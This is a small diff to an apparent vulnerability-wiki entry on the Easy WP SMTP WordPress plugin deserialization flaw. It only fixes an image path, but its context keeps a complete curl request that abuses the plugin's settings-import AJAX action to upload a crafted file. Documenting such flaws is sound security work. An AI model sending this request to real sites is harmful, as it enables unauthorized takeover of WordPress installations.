@@ -23,4 +23,4 @@ SMTP，并进行相关配置。
 
     $ curl https://0-sec.org/wp-admin/admin-ajax.php -F 'action=swpsmtp_clear_log' -F 'swpsmtp_import_settings=1' -F 'swpsmtp_import_settings_file=@/tmp/upload.txt'
 
-![](/Users/aresx/Documents/VulWiki/.resource/WordPressPlugin-EasyWPSMTP反序列化漏洞/media/rId24.shtml)
+![](./.resource/WordPressPlugin-EasyWPSMTP反序列化漏洞/media/rId24.shtml)
